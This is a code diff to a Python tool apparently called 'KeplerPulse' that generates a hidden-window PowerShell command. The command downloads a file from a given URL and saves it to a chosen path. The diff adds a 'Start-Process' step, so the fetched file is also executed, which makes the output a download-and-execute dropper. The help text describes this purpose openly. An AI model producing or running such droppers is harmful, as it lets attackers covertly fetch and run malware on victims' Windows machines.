@@ -13,7 +13,10 @@ banner = """
 
 """
 def __main__():
-    powershell_ = "powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{source}','{dest}')"
+    powershell_ = r"""
+    powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{source}','{dest}'); Start-Process "{dest}"
+    """
+    
     parser = argparse.ArgumentParser(description="KeplerPulse")
     parser.add_argument("--p", required=True, help="URL or Link to file to Download and Execute.")
     parser.add_argument("--t", required=True,help="Target to save as.")
@@ -24,7 +27,6 @@ def __main__():
     dest = arguments.t
     stamp = str(time.strftime("%m/%d/%m"))
     print(Style.BRIGHT + Fore.LIGHTRED_EX + banner + Style.RESET_ALL)
-    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Generating.." + Style.RESET_ALL)
     old = powershell_.replace("{source}", payload)
     new = old.replace("{dest}", dest)
    
@@ -34,3 +36,4 @@ def __main__():
 
 if __name__ == "__main__":
     __main__()
+
